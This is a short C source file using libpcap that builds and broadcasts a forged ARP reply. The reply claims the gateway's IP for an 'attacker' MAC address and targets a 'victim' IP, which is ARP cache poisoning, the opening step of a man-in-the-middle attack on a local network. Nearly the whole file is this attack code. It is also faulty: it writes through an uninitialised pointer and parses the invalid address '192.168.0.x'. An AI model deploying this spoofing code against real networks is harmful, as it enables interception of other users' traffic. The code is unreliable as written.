#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>

void send_arp_for_all_user(pcap_t *handle, struct ether_addr *attacker_mac, struct in_addr *gateway_ip) {
	struct ether_header ether;
	struct ether_arp arp;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;
	struct ether_addr destination, target;
	struct in_addr *victim_ip;
	//int i;
	char mac_imm[50];
	struct ether_addr gateway_mac;

	ether.ether_type = htons(ETHERTYPE_ARP);

	ether_aton_r("ff:ff:ff:ff:ff:ff", &destination);

	memcpy(ether.ether_dhost, &destination, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REPLY);

	memcpy(&arp.arp_sha, attacker_mac, ETHER_ADDR_LEN);
	memcpy(&arp.arp_spa, gateway_ip, sizeof(struct in_addr));

	ether_aton_r("00:00:00:00:00:00", &target);

	memcpy(&arp.arp_tha, &target, ETHER_ADDR_LEN);

	inet_aton("192.168.0.x", victim_ip);

	memcpy(&arp.arp_tpa, victim_ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
    
    if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
    		printf("error2\n");
}